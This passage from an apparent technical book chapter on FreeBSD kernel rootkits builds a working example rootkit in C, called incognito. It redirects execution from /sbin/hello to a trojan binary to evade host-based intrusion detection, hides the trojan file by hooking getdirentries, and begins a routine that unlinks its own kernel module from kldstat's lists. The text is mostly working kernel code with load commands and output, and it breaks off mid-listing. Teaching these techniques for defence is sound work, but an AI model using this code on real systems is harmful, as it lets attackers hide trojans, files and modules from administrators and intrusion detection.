<html><head></head><body><div class="chapter" xml:lang="en"><div class="titlepage"><div><div><h1 class="title"><a id="putting_it_all_together"/>Chapter 6. PUTTING IT ALL TOGETHER</h1></div></div></div><p>We'll now use the techniques from the previous chapters to write a complete example rootkit—albeit a trivial one—to bypass <span class="emphasis"><em>Host-based Intrusion Detection Systems (HIDSes)</em></span>.</p><div class="sect1" xml:lang="en"><div class="titlepage"><div><div><h1 class="title"><a id="what_hidses_do"/>What HIDSes Do</h1></div></div></div><p>In general, an HIDS is designed to monitor, detect, and log the modifications to the files on a filesystem. That is, it is designed to detect file tampering and trojaned binaries. For every file, an HIDS creates a cryptographic hash of the file data and records it in a database; any change to a file results in a different hash being generated. Whenever an HIDS audits a filesystem, it compares the current hash of every file with its counterpart in the database; if the two differ, the file is flagged.<a id="IDX-CHP-6-0321" class="indexterm"/><a id="IDX-CHP-6-0322" class="indexterm"/><a id="IDX-CHP-6-0323" class="indexterm"/></p><p>In principle this is a good idea, but . . .</p></div></div>
<div class="sect1" xml:lang="en"><div class="titlepage"><div><div><h1 class="title"><a id="bypassing_hidses"/>Bypassing HIDSes</h1></div></div></div><p>The problem with HIDS software is that it trusts and uses the operating system's APIs. By abusing this trust (e.g., hooking these APIs) you can bypass any HIDS.<a id="IDX-CHP-6-0327" class="indexterm"/><a id="IDX-CHP-6-0324" class="indexterm"/><a id="IDX-CHP-6-0325" class="indexterm"/><a id="IDX-CHP-6-0326" class="indexterm"/></p><div class="note" style="margin-left: 0.5in; margin-right: 0.5in;"><h3 class="title">Note</h3><p>It's somewhat ironic that software designed to detect a root level compromise (e.g., the tampering of system binaries) would trust the underlying operating system.</p></div><p>The question now is, "Which calls do I hook?" The answer depends on what you wish to accomplish. Consider the following scenario. You have a FreeBSD machine with the binary shown in Listing 6-1 installed in /sbin/.</p><a id="I_programlisting6_d1e6345"/><pre class="programlisting">
#include &lt;stdio.h&gt;

int main(int argc, char *argv[])
{
        printf("May the force be with you.\n");
        return(0);
}
</pre><p><span class="emphasis"><em>Listing 6-1: hello.c</em></span></p><p>You want to replace that binary with a Trojan version—which simply prints a different debug message, shown in Listing 6-2—without alerting the HIDS, of course.</p><a id="I_programlisting6_d1e6352"/><pre class="programlisting">
#include &lt;stdio.h&gt;

int main(int argc, char *argv[])
{
        printf("May the schwartz be with you!\n");
        return(0);
}
</pre><p><span class="emphasis"><em>Listing 6-2: trojan_hello.c</em></span></p><p>This can be accomplished by performing an <span class="emphasis"><em>execution redirection</em></span> (halflife, 1997)—which simply switches the execution of one binary with another—so that whenever there is a request to execute <code class="literal">hello</code>, you intercept it and execute <code class="literal">trojan_hello</code> instead. This works because you don't replace (or even touch) the original binary and, as a result, the HIDS will always calculate the correct hash.<a id="IDX-CHP-6-0328" class="indexterm"/><a id="IDX-CHP-6-0329" class="indexterm"/><a id="IDX-CHP-6-0330" class="indexterm"/></p><p>There are of course some "hiccups" to this approach, but we'll deal with them later, as they come up.</p></div>
<div class="sect1" xml:lang="en"><div class="titlepage"><div><div><h1 class="title"><a id="execution_redirection"/>Execution Redirection</h1></div></div></div><p>The execution redirection routine in the example rootkit is achieved by hooking the <code class="literal">execve</code> system call. This call is responsible for file execution and is implemented in the file /sys/kern/kern_exec.c as follows.<a id="IDX-CHP-6-0331" class="indexterm"/><a id="IDX-CHP-6-0332" class="indexterm"/><a id="IDX-CHP-6-0333" class="indexterm"/></p><a id="I_programlisting6_d1e6406"/><pre class="programlisting">
int
execve(td, uap)
        struct thread *td;
        struct execve_args /* {
                char *fname;
                char **argv;
                char **envv;
        } */ *uap;
{
        int error;
        struct image_args args;

        ❶error = exec_copyin_args(&amp;args, uap-&gt;fname, UIO_USERSPACE,
            uap-&gt;argv, uap-&gt;envv);

        if (error == 0)
                 ❷error = kern_execve(td, &amp;args, NULL);

        exec_free_args(&amp;args);

        return (error);
}
</pre><p>Note how the <code class="literal">execve</code> system call ❶ copies in its arguments (<code class="literal">uap</code>) from the user data space to a temporary buffer (<code class="literal">args</code>) and then ❷ passes that buffer to the <code class="literal">kern_execve</code> function, which actually performs the file execution. This means that in order to redirect the execution of one binary into another, you simply have to insert a new set of <code class="literal">execve</code> arguments or change the existing one—within the current process's user data space—before <code class="literal">execve</code> calls <code class="literal">exec_copyin_args</code>. Listing 6-3 (which is based on Stephanie Wehner's exec.c) offers an example.</p><a id="I_programlisting6_d1e6432"/><pre class="programlisting">
#include &lt;sys/types.h&gt;
#include &lt;sys/param.h&gt;
#include &lt;sys/proc.h&gt;
#include &lt;sys/module.h&gt;
#include &lt;sys/sysent.h&gt;
#include &lt;sys/kernel.h&gt;
#include &lt;sys/systm.h&gt;
#include &lt;sys/syscall.h&gt;
#include &lt;sys/sysproto.h&gt;

#include &lt;vm/vm.h&gt;
#include &lt;vm/vm_page.h&gt;
#include &lt;vm/vm_map.h&gt;

#define ORIGINAL        "/sbin/hello"
#define TROJAN          "/sbin/trojan_hello"

/*
 * execve system call hook.
 * Redirects the execution of ORIGINAL into TROJAN.
*/
static int
execve_hook(struct thread *td, void *syscall_args)
{
        struct execve_args /* {
                char *fname;
                char **argv;
                char **envv;
        } */ *uap;
        uap = (struct execve_args *)syscall_args;

        struct execve_args kernel_ea;
        struct execve_args *user_ea;
        struct vmspace *vm;
        vm_offset_t base, addr;
        char t_fname[] = TROJAN;

        /* Redirect this process? */
        ❶if (strcmp(uap-&gt;fname, ORIGINAL) == 0) {
                /*
                 * Determine the end boundary address of the current
                 * process's user data space.
                 */
                vm = curthread-&gt;td_proc-&gt;p_vmspace;
                base = round_page((vm_offset_t) vm-&gt;vm_daddr);
                ❷addr = base + ctob(vm-&gt;vm_dsize);

                /*
                 * Allocate a PAGE_SIZE null region of memory for a new set
                 * of execve arguments.
                 */
                 ❸vm_map_find(&amp;vm-&gt;vm_map, NULL, 0, &amp;addr, PAGE_SIZE, FALSE,
                    VM_PROT_ALL, VM_PROT_ALL, 0);
                vm-&gt;vm_dsize += btoc(PAGE_SIZE);

                /*
                 * Set up an execve_args structure for TROJAN. Remember, you
                 * have to place this structure into user space, and because
                 * you can't point to an element in kernel space once you are
                 * in user space, you'll have to place any new "arrays" that
                 * this structure points to in user space as well.
                 */
                ❹copyout(&amp;t_fname, (char *)addr, strlen(t_fname));
                kernel_ea.fname = (char *)addr;
                kernel_ea.argv = uap-&gt;argv;
                kernel_ea.envv = uap-&gt;envv;

                /* Copy out the TROJAN execve_args structure. */
                user_ea = (struct execve_args *)addr + sizeof(t_fname);
                ❺copyout(&amp;kernel_ea, user_ea, sizeof(struct execve_args));

                /* Execute TROJAN. */
                ❻return(execve(curthread, user_ea));
        }
        return(execve(td, syscall_args));

}

/* The function called at load/unload. */
static int
load(struct module *module, int cmd, void *arg)
{
        sysent[SYS_execve].sy_call = (sy_call_t *)execve_hook;

        return(0);

}

static moduledata_t incognito_mod = {
        "incognito",            /* module name */
        load,                   /* event handler */
        NULL                    /* extra data */
};

DECLARE_MODULE(incognito, incognito_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
</pre><p><span class="emphasis"><em>Listing 6-3: incognito-0.1.c</em></span></p><p>In this listing the function <code class="literal">execve_hook</code>❶ first checks the name of the file to be executed. If the filename is /sbin/hello, ❷ the end boundary address of the current process's user data space is stored in <code class="literal">addr</code>, which is then passed to ❸ <code class="literal">vm_map_find</code> to map a <code class="literal">PAGE_SIZE</code> block of <code class="literal">NULL</code> memory there. Next, ❹ an <code class="literal">execve</code> arguments structure is set up for the <code class="literal">trojan_hello</code> binary, which is then ❺ inserted into the newly "allocated" user data space. Finally, ❻ <code class="literal">execve</code> is called with the address of the <code class="literal">trojan_hello execve_args</code> structure as its second argument—effectively redirecting the execution of <code class="literal">hello</code> into <code class="literal">trojan_hello</code>.</p><div class="note" style="margin-left: 0.5in; margin-right: 0.5in;"><h3 class="title">Note</h3><p>An interesting detail about <em class="replaceable"><code>execve_hook</code></em> is that, with one or two slight modifications, it's the exact code required to execute a user space process from kernel space.</p></div><p>One additional point is also worth mentioning. Notice how, this time around, the event handler function does not uninstall the system call hook; that would require a reboot. This is because the "live" rootkit has no need for an unload routine—once you install it, you want it to remain installed.</p><p>The following output shows the example rootkit in action.</p><a id="I_programlisting6_d1e6483"/><pre class="programlisting">
<strong class="userinput"><code>$ hello</code></strong>
May the force be with you.
<strong class="userinput"><code>$ trojan_hello</code></strong>
May the schwartz be with you!
<strong class="userinput"><code>$ sudo kldload ./incognito-0.1.ko
$ hello</code></strong>
May the schwartz be with you!
</pre><p>Excellent, it works. We have now effectively trojaned <code class="literal">hello</code> and no HIDS will be the wiser—except that we have placed a new binary (<code class="literal">trojan_hello</code>) on the filesystem, which any HIDS will flag. D'oh!</p></div>
<div class="sect1" xml:lang="en"><div class="titlepage"><div><div><h1 class="title"><a id="file_hiding"/>File Hiding</h1></div></div></div><p>To remedy this problem, let's hide <code class="literal">trojan_hello</code> so that it doesn't appear on the filesystem. This can be accomplished by hooking the <code class="literal">getdirentries</code> system call. This call is responsible for listing (i.e., returning) a directory's contents, and it is implemented in the file /sys/kern/vfs_syscalls.c as follows.<a id="IDX-CHP-6-0338" class="indexterm"/><a id="IDX-CHP-6-0339" class="indexterm"/><a id="IDX-CHP-6-0334" class="indexterm"/><a id="IDX-CHP-6-0335" class="indexterm"/><a id="IDX-CHP-6-0336" class="indexterm"/><a id="IDX-CHP-6-0337" class="indexterm"/></p><div class="note" style="margin-left: 0.5in; margin-right: 0.5in;"><h3 class="title">Note</h3><p>Take a look at this code and try to discern some structure in it. If you don't understand all of it, don't worry. An explanation of the <em class="replaceable"><code>getdirentries</code></em> system call appears after this listing.</p></div><a id="I_programlisting6_d1e6556"/><pre class="programlisting">
int
getdirentries(td, uap)
        struct thread *td;
        register struct getdirentries_args /* {
                int fd;
                char *buf;
                u_int count;
                long *basep;
        } */ *uap;
{
        struct vnode *vp;
        struct file *fp;
        struct uio auio;
        struct iovec aiov;
        int vfslocked;
        long loff;
        int error, eofflag;

        if ((error = getvnode(td-&gt;td_proc-&gt;p_fd, uap-&gt;fd, &amp;fp)) != 0)
                return (error);
        if ((fp-&gt;f_flag &amp; FREAD) == 0) {
                fdrop(fp, td);
                return (EBADF);
        }
        vp = fp-&gt;f_vnode;
unionread:
        vfslocked = VFS_LOCK_GIANT(vp-&gt;v_mount);
        if (vp-&gt;v_type != VDIR) {
                error = EINVAL;
                goto fail;
        }
        aiov.iov_base = uap-&gt;buf;
        aiov.iov_len = uap-&gt;count;
        auio.uio_iov = &amp;aiov;
        auio.uio_iovcnt = 1;
        auio.uio_rw = UIO_READ;
        auio.uio_segflg = UIO_USERSPACE;
        auio.uio_td = td;
        auio.uio_resid = uap-&gt;count;
        /* vn_lock(vp, LK_SHARED | LK_RETRY, td); */
        vn_lock(vp, LK_EXCLUSIVE | LK_RETRY, td);
        loff = auio.uio_offset = fp-&gt;f_offset;
#ifdef MAC
        error = mac_check_vnode_readdir(td-&gt;td_ucred, vp);
        if (error == 0)
#endif
                error = VOP_READDIR(vp, &amp;auio, fp-&gt;f_cred, &amp;eofflag, NULL,
                    NULL);
        fp-&gt;f_offset = auio.uio_offset;
        VOP_UNLOCK(vp, 0, td);
        if (error)
                goto fail;
        if (uap-&gt;count == auio.uio_resid) {
                if (union_dircheckp) {
                        error = union_dircheckp(td, &amp;vp, fp);
                        if (error == −1) {
                                VFS_UNLOCK_GIANT(vfslocked);
                                goto unionread;
                        }
                        if (error)
                                goto fail;
                }
                /*
                 * XXX We could delay dropping the lock above but
                 * union_dircheckp complicates things.
                 */
                vn_lock(vp, LK_EXCLUSIVE | LK_RETRY, td);
                if ((vp-&gt;v_vflag &amp; VV_ROOT) &amp;&amp;
                    (vp-&gt;v_mount-&gt;mnt_flag &amp; MNT_UNION)) {
                        struct vnode *tvp = vp;
                        vp = vp-&gt;v_mount-&gt;mnt_vnodecovered;
                        VREF(vp);
                        fp-&gt;f_vnode = vp;
                        fp-&gt;f_data = vp;
                        fp-&gt;f_offset = 0;
                        vput(tvp);
                        VFS_UNLOCK_GIANT(vfslocked);
                        goto unionread;
                }
                VOP_UNLOCK(vp, 0, td);
        }
        if (uap-&gt;basep != NULL) {
                error = copyout(&amp;loff, uap-&gt;basep, sizeof(long));
        }
        ❶td-&gt;td_retval[0] = uap-&gt;count - auio.uio_resid;
fail:
        VFS_UNLOCK_GIANT(vfslocked);
        fdrop(fp, td);
        return (error);
}
</pre><p>The <code class="literal">getdirentries</code> system call reads in the directory entries referenced by the directory (i.e., the file descriptor) <code class="literal">fd</code> into the buffer <code class="literal">buf</code>. Put more simply, <code class="literal">getdirentries</code> gets directory entries. If successful, ❶ the number of bytes actually transferred is returned. Otherwise, <code class="literal">−1</code> is returned and the global variable <code class="literal">errno</code> is set to indicate the error.</p><p>The directory entries read into <code class="literal">buf</code> are stored as a series of <code class="literal">dirent</code> structures, defined in the <code class="literal">&lt;sys/dirent.h&gt;</code> header as follows:</p><a id="I_programlisting6_d1e6590"/><pre class="programlisting">
struct dirent {
        __uint32_t d_fileno;            /* inode number */
        __uint16_t d_reclen;            /* length of this directory entry */
        __uint8_t  d_type;              /* file type */
        __uint8_t  d_namlen;            /* length of the filename */
#if __BSD_VISIBLE
#define MAXNAMLEN       255
        char    d_name[MAXNAMLEN + 1];  /* filename */
#else
        char    d_name[255 + 1];        /* filename */
#endif
};
</pre><p>As this listing shows, the context of each directory entry is maintained in a <code class="literal">dirent</code> structure. This means that in order to hide a file on the filesystem, you simply have to prevent <code class="literal">getdirentries</code> from storing the file's <code class="literal">dirent</code> structure in <code class="literal">buf</code>. Listing 6-4 is an example rootkit adapted to do just that (based on pragmatic's file-hiding routine, 1999).<a id="IDX-CHP-6-0340" class="indexterm"/></p><div class="note" style="margin-left: 0.5in; margin-right: 0.5in;"><h3 class="title">Note</h3><p>In the interest of saving space, I haven't relisted the execution redirection routine (i.e., the <code class="literal">execve_hook</code> function) in its entirety.</p></div><a id="I_programlisting6_d1e6617"/><pre class="programlisting">
#include &lt;sys/types.h&gt;
#include &lt;sys/param.h&gt;
#include &lt;sys/proc.h&gt;
#include &lt;sys/module.h&gt;
#include &lt;sys/sysent.h&gt;
#include &lt;sys/kernel.h&gt;
#include &lt;sys/systm.h&gt;
#include &lt;sys/syscall.h&gt;
#include &lt;sys/sysproto.h&gt;
#include &lt;sys/malloc.h&gt;

#include &lt;vm/vm.h&gt;
#include &lt;vm/vm_page.h&gt;
#include &lt;vm/vm_map.h&gt;

#include &lt;dirent.h&gt;

#define ORIGINAL        "/sbin/hello"
#define TROJAN          "/sbin/trojan_hello"
#define T_NAME          "trojan_hello"

/*
 * execve system call hook.
 * Redirects the execution of ORIGINAL into TROJAN.
 */
static int
execve_hook(struct thread *td, void *syscall_args)
{
. . .
}

/*
 * getdirentries system call hook.
 * Hides the file T_NAME.
 */
static int
getdirentries_hook(struct thread *td, void *syscall_args)
{
        struct getdirentries_args /* {
                int fd;
                char *buf;
                u_int count;
                long *basep;
        } */ *uap;
        uap = (struct getdirentries_args *)syscall_args;

        struct dirent *dp, *current;
        unsigned int size, count;

        /*
         * Store the directory entries found in fd in buf, and record the
         * number of bytes actually transferred.
         */
        ❶getdirentries(td, syscall_args);
        size = td-&gt;td_retval[0];

        /* Does fd actually contain any directory entries? */
        ❷if (size &gt; 0) {
                MALLOC(dp, struct dirent *, size, M_TEMP, M_NOWAIT);
                ❸copyin(uap-&gt;buf, dp, size);

                current = dp;
                count = size;

                /*
                 * Iterate through the directory entries found in fd.
                 * Note: The last directory entry always has a record length
                 * of zero.
                 */
                while ((current-&gt;d_reclen != 0) &amp;&amp; (count &gt; 0)) {
                        count -= current-&gt;d_reclen;

                        /* Do we want to hide this file? */
                        ❹if(strcmp((char *)&amp;(current-&gt;d_name), T_NAME) == 0)
                       {
                                /*
                                 * Copy every directory entry found after
                                 * T_NAME over T_NAME, effectively cutting it
                                 * out.
                                 */
                                if (count != 0)
                                        ❺bcopy((char *)current +
                                            current-&gt;d_reclen, current,
                                            count);

                                size -= current-&gt;d_reclen;
                                break;
                        }


                        /*
                         * Are there still more directory entries to
                         * look through?
                         */
                        if (count != 0)
                                /* Advance to the next record. */
                                current = (struct dirent *)((char *)current +
                                    current-&gt;d_reclen);

                }


                /*

                 * If T_NAME was found in fd, adjust the "return values" to
                 * hide it. If T_NAME wasn't found...don't worry 'bout it.
                 */
                ❻td-&gt;td_retval[0] = size;
                ❼copyout(dp, uap-&gt;buf, size);

                FREE(dp, M_TEMP);
        }

        return(0);
}

/* The function called at load/unload. */
static int
load(struct module *module, int cmd, void *arg)
{
        sysent[SYS_execve].sy_call = (sy_call_t *)execve_hook;
        sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;

        return(0);
}
static moduledata_t incognito_mod = {
        "incognito",            /* module name */
        load,                   /* event handler */
        NULL                    /* extra data */
};

DECLARE_MODULE(incognito, incognito_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
</pre><p><span class="emphasis"><em>Listing 6-4: incognito-0.2.c</em></span></p><p>In this code the function <code class="literal">getdirentries_hook</code> ❶ first calls <code class="literal">getdirentries</code> in order to store the directory entries found in <code class="literal">fd</code> in <code class="literal">buf</code>. Next, ❷ the number of bytes actually transferred is checked, and if it's greater than zero (i.e., if <code class="literal">fd</code> actually contains any directory entries) ❸ the contents of <code class="literal">buf</code> (which is a series of <code class="literal">dirent</code> structures) are copied into kernel space. Afterward, ❹ the filename of each <code class="literal">dirent</code> structure is compared with the constant <code class="literal">T_NAME</code> (which is <code class="literal">trojan_hello</code>, in this case). If a match is found, ❺ the "lucky" <code class="literal">dirent</code> structure is removed from the kernel space copy of <code class="literal">buf</code>, which is eventually ❼ copied back out, overwriting the contents of <code class="literal">buf</code> and effectively hiding <code class="literal">T_NAME</code> (i.e., <code class="literal">trojan_hello</code>). Additionally, to keep things consistent, ❻ the number of bytes actually transferred is adjusted to account for "losing" this <code class="literal">dirent</code> structure.<a id="IDX-CHP-6-0341" class="indexterm"/></p><p>Now, if you install the new rootkit, you get:</p><a id="I_programlisting6_d1e6682"/><pre class="programlisting">
<strong class="userinput"><code>$ ls /sbin/t*</code></strong>
/sbin/trojan_hello /sbin/tunefs
<strong class="userinput"><code>$ sudo kldload ./incognito-0.2.ko
$ hello</code></strong>
May the schwartz be with you!
<strong class="userinput"><code>$ ls /sbin/t*</code></strong>
/sbin/tunefs
</pre><p>Wonderful. We have now effectively trojaned <code class="literal">hello</code> without leaving a footprint on the filesystem.<sup>[<a id="CHP-6-FN-1" href="#ftn.CHP-6-FN-1" class="footnote">1</a>]</sup> Of course, none of this matters since a simple <code class="literal">kldstat(8)</code> reveals the rootkit:</p><a id="I_programlisting6_d1e6726"/><pre class="programlisting">
$ <strong class="userinput"><code>kldstat</code></strong>
Id Refs Address    Size     Name
 1    4 0xc0400000 63070c   kernel
 2   16 0xc0a31000 568dc    acpi.ko
 3    1 0xc1ebc000 2000     incognito-0.2.ko
</pre><p>Darn it!</p><div class="footnotes"><br/><hr/><div class="footnote"><p><sup>[<a id="ftn.CHP-6-FN-1" href="#CHP-6-FN-1" class="para">1</a>] </sup><sup>1</sup> Actually, you can still find <code class="literal">trojan_hello</code> with <code class="literal">ls /sbin/trojan_hello</code>, because direct lookups aren't blocked. Blocking the file from a direct lookup isn't too hard, but it is tedious. You will need to hook <code class="literal">open(2)</code>, <code class="literal">stat(2)</code>, and <code class="literal">lstat(2)</code>, and have them return <code class="literal">ENOENT</code> whenever the file is /sbin/trojan_hello.</p></div></div></div>
<div class="sect1" xml:lang="en"><div class="titlepage"><div><div><h1 class="title"><a id="hiding_a_kld"/>Hiding a KLD</h1></div></div></div><p>To remedy this problem, we'll employ some DKOM to hide the rootkit, which is, technically, a KLD.<a id="IDX-CHP-6-0342" class="indexterm"/><a id="IDX-CHP-6-0343" class="indexterm"/><a id="IDX-CHP-6-0344" class="indexterm"/><a id="IDX-CHP-6-0345" class="indexterm"/><a id="IDX-CHP-6-0346" class="indexterm"/></p><p>Recall from <a class="xref" href="ch01.html" title="Chapter 1. LOADABLE KERNEL MODULES">Chapter 1</a> that whenever you load a KLD into the kernel, you are actually loading a linker file that contains one or more kernel modules. As a result, whenever a KLD is loaded, it is stored on two different lists: <code class="literal">linker_files</code> and <code class="literal">modules</code>. As their names imply, <code class="literal">linker_files</code> contains the set of loaded linker files, while <code class="literal">modules</code> contains the set of loaded kernel modules.</p><p>As with the previous DKOM code, the KLD hiding routine will traverse both of these lists in a safe manner and remove the structure(s) of your choosing.</p><div class="sect2" xml:lang="en"><div class="titlepage"><div><div><h2 class="title"><a id="the_linker_files_list"/>The linker_files List</h2></div></div></div><p>The <code class="literal">linker_files</code> list is defined in the file /sys/kern/kern_linker.c as follows:<a id="IDX-CHP-6-0351" class="indexterm"/><a id="IDX-CHP-6-0347" class="indexterm"/><a id="IDX-CHP-6-0348" class="indexterm"/><a id="IDX-CHP-6-0349" class="indexterm"/><a id="IDX-CHP-6-0350" class="indexterm"/></p><a id="I_programlisting6_d1e6819"/><pre class="programlisting">
static linker_file_list_t linker_files;
</pre><p>Notice that <code class="literal">linker_files</code> is declared as of type <code class="literal">linker_file_list_t</code>, which is defined in the <code class="literal">&lt;sys/linker.h&gt;</code> header as follows:</p><a id="I_programlisting6_d1e6832"/><pre class="programlisting">
typedef TAILQ_HEAD(, linker_file) linker_file_list_t;
</pre><p>From these listings, you can see that <code class="literal">linker_files</code> is simply a doubly-linked tail queue of <code class="literal">linker_file</code> structures.</p><p>An interesting detail about <code class="literal">linker_files</code> is that it has an associated counter, which is defined in the file /sys/kern/kern_linker.c as:</p><a id="I_programlisting6_d1e6847"/><pre class="programlisting">
static int next_file_id = 1;
</pre><p>When a linker file is loaded (i.e., whenever an entry is added to <code class="literal">linker_files</code>), its file ID number becomes the current value of <code class="literal">next_file_id</code>, which is then increased by one.</p><p>Another interesting detail about <code class="literal">linker_files</code> is that, unlike the other lists in this book, it is not protected by a dedicated lock; this forces us to make use of <code class="literal">Giant</code>. <code class="literal">Giant</code> is, more or less, the "catchall" lock designed to protect the entire kernel. It is defined in the <code class="literal">&lt;sys/mutex.h&gt;</code> header as follows:</p><a id="I_programlisting6_d1e6871"/><pre class="programlisting">
extern struct mtx Giant;
</pre><div class="note" style="margin-left: 0.5in; margin-right: 0.5in;"><h3 class="title">Note</h3><p>In FreeBSD 6.0, <em class="replaceable"><code>linker_files</code></em> does have an associated lock, which is named <em class="replaceable"><code>kld_mtx</code></em>. However, <em class="replaceable"><code>kld_mtx</code></em> doesn't really protect <em class="replaceable"><code>linker_files</code></em>, which is why we use <em class="replaceable"><code>Giant</code></em> instead. In FreeBSD version 7, <em class="replaceable"><code>linker_files</code></em> is protected by an sx lock.</p></div></div><div class="sect2" xml:lang="en"><div class="titlepage"><div><div><h2 class="title"><a id="the_linker_file_structure"/>The linker_file Structure</h2></div></div></div><p>The context of each linker file is maintained in a <code class="literal">linker_file</code> structure, which is defined in the <code class="literal">&lt;sys/linker.h&gt;</code> header. The following list describes the fields in <code class="literal">struct linker_file</code> that you'll need to understand in order to hide a linker file.<a id="IDX-CHP-6-0352" class="indexterm"/></p><div class="variablelist"><dl><dt><span class="term"><span class="emphasis"><em>int refs;</em></span></span></dt><dd><p>This field maintains the linker file's reference count.</p><p>An important point to note is that the very first <code class="literal">linker_file</code> structure on <code class="literal">linker_files</code> is the current kernel image, and whenever a linker file is loaded, this structure's <code class="literal">refs</code> field is increased by one, as illustrated below:</p><a id="I_programlisting6_d1e6934"/><pre class="programlisting">
$ <strong class="userinput"><code>kldstat</code></strong>
Id Refs Address    Size     Name
 1    3 0xc0400000 63070c   kernel
 2   16 0xc0a31000 568dc    acpi.ko
$ <strong class="userinput"><code>sudo kldload ./incognito-0.2.ko</code></strong>
$ <strong class="userinput"><code>kldstat</code></strong>
Id Refs Address    Size     Name
 1    4 0xc0400000 63070c   kernel
 2   16 0xc0a31000 568dc    acpi.ko
 3    1 0xc1e89000 2000     incognito-0.2.ko
</pre><p>As you can see, prior to loading incognito-0.2.ko, the current kernel image's reference count is 3, but afterward, it's 4. Thus, when hiding a linker file, you have to remember to decrease the current kernel image's <code class="literal">refs</code> field by one.</p></dd><dt><span class="term"><strong class="userinput"><code>TAILQ_ENTRY(linker_file) link;</code></strong></span></dt><dd><p>This field contains the linkage pointers that are associated with the <code class="literal">linker_file</code> structure, which is stored on the <code class="literal">linker_files</code> list. This field is referenced during insertion, removal, and traversal of <code class="literal">linker_files</code>.<a id="IDX-CHP-6-0353" class="indexterm"/></p></dd><dt><span class="term"><strong class="userinput"><code>char* filename;</code></strong></span></dt><dd><p>This field contains the linker file's name.</p></dd></dl></div></div><div class="sect2" xml:lang="en"><div class="titlepage"><div><div><h2 class="title"><a id="the_modules_list"/>The modules List</h2></div></div></div><p>The <code class="literal">modules</code> list is defined in the file /sys/kern/kern_module.c as follows:<a id="IDX-CHP-6-0357" class="indexterm"/><a id="IDX-CHP-6-0354" class="indexterm"/><a id="IDX-CHP-6-0355" class="indexterm"/><a id="IDX-CHP-6-0356" class="indexterm"/></p><a id="I_programlisting6_d1e7008"/><pre class="programlisting">
static modulelist_t modules;
</pre><p>Notice that <code class="literal">modules</code> is declared as of type <code class="literal">modulelist_t</code>, which is defined in the file /sys/kern/kern_module.c as follows:</p><a id="I_programlisting6_d1e7018"/><pre class="programlisting">
typedef TAILQ_HEAD(, module) modulelist_t;
</pre><p>From these listings, you can see that <code class="literal">modules</code> is simply a doubly-linked tail queue of <code class="literal">module</code> structures.</p><p>Like the <code class="literal">linker_files</code> list, <code class="literal">modules</code> also has an associated counter, which is defined in the file /sys/kern/kern_module.c as:</p><a id="I_programlisting6_d1e7036"/><pre class="programlisting">
static int nextid = 1;
</pre><p>For every kernel module that is loaded, its modid becomes the current value of <code class="literal">nextid</code>, which is then increased by one.</p><p>The resource access control associated with the <code class="literal">modules</code> list is defined in the <code class="literal">&lt;sys/module.h&gt;</code> header as follows:</p><a id="I_programlisting6_d1e7051"/><pre class="programlisting">
extern struct sx modules_sx;
</pre></div><div class="sect2" xml:lang="en"><div class="titlepage"><div><div><h2 class="title"><a id="the_module_structure"/>The module Structure</h2></div></div></div><p>The context of each kernel module is maintained in a <code class="literal">module</code> structure, which is defined in the file /sys/kern/kern_module.c. The following list describes the fields in <code class="literal">struct module</code> that you'll need to understand in order to hide a kernel module.</p><div class="variablelist"><dl><dt><span class="term"><strong class="userinput"><code>TAILQ_ENTRY(module) link;</code></strong></span></dt><dd><p>This field contains the linkage pointers that are associated with the <code class="literal">module</code> structure, which is stored on the <code class="literal">modules</code> list. This field is referenced during insertion, removal, and traversal of <code class="literal">modules</code>.</p></dd><dt><span class="term"><strong class="userinput"><code>char* name;</code></strong></span></dt><dd><p>This field contains the kernel module's name.</p></dd></dl></div></div><div class="sect2" xml:lang="en"><div class="titlepage"><div><div><h2 class="title"><a id="example-id9"/>Example</h2></div></div></div><p>Listing 6-5 shows the new-and-improved rootkit, which can now hide itself. It works by removing its <code class="literal">linker_file</code> and <code class="literal">module</code> structure from the <code class="literal">linker_files</code> and <code class="literal">modules</code> lists. To keep things consistent, it also decrements the current kernel image's reference count, the linker files counter (<code class="literal">next_file_id</code>), and the modules counter (<code class="literal">nextid</code>) by one.<a id="IDX-CHP-6-0358" class="indexterm"/></p><div class="note" style="margin-left: 0.5in; margin-right: 0.5in;"><h3 class="title">Note</h3><p>To save space, I haven't relisted the execution redirection and file hiding routines.</p></div><a id="I_programlisting6_d1e7120"/><pre class="programlisting">
#include &lt;sys/types.h&gt;
#include &lt;sys/param.h&gt;
#include &lt;sys/proc.h&gt;
#include &lt;sys/module.h&gt;
#include &lt;sys/sysent.h&gt;
#include &lt;sys/kernel.h&gt;
#include &lt;sys/systm.h&gt;
#include &lt;sys/syscall.h&gt;
#include &lt;sys/sysproto.h&gt;
#include &lt;sys/malloc.h&gt;

#include &lt;sys/linker.h&gt;
#include &lt;sys/lock.h&gt;
#include &lt;sys/mutex.h&gt;

#include &lt;vm/vm.h&gt;
#include &lt;vm/vm_page.h&gt;
#include &lt;vm/vm_map.h&gt;

#include &lt;dirent.h&gt;

#define ORIGINAL        "/sbin/hello"
#define TROJAN          "/sbin/trojan_hello"
#define T_NAME          "trojan_hello"
#define VERSION         "incognito-0.3.ko"

/*
 * The following is the list of variables you need to reference in order
 * to hide this module, which aren't defined in any header files.
 */
extern linker_file_list_t linker_files;
extern struct mtx kld_mtx;
extern int next_file_id;
typedef TAILQ_HEAD(, module) modulelist_t;
extern modulelist_t modules;
extern int nextid;
struct module {
        TAILQ_ENTRY(module)     link;    /* chain together all modules */
        TAILQ_ENTRY(module)     flink;   /* all modules in a file */
        struct linker_file      *file;   /* file which contains this module */
        int                     refs;    /* reference count */
        int                     id;      /* unique id number */
        char                    *name;   /* module name */
        modeventhand_t          handler; /* event handler */
        void                    *arg;    /* argument for handler */
        modspecific_t           data;    /* module specific data */
};

/*
 * execve system call hook.
 * Redirects the execution of ORIGINAL into TROJAN.
 */
static int
execve_hook(struct thread *td, void *syscall_args)
{
. . .
}

/*
 * getdirentries system call hook.
 * Hides the file T_NAME.
 */
static int
getdirentries_hook(struct thread *td, void *syscall_args)
{
. . .
}

/* The function called at load/unload. */
static int
load(struct module *module, int cmd, void *arg)
{
        struct linker_file *lf;
        struct module *mod;

        mtx_lock(&amp;Giant);
        mtx_lock(&amp;kld_mtx);

        /* Decrement the current kernel image's reference count. */
        (&amp;linker_files)-&gt;tqh_first-&gt;refs--;

        /*
         * Iterate through the linker_files list, looking for VERSION.
         * If found, decrement next_file_id and remove from list.
         */
        TAILQ_FOREACH(lf, &amp;linker_files, link) {
                if (strcmp(lf-&gt;filename, VERSION) == 0) {
                        next_file_id--;
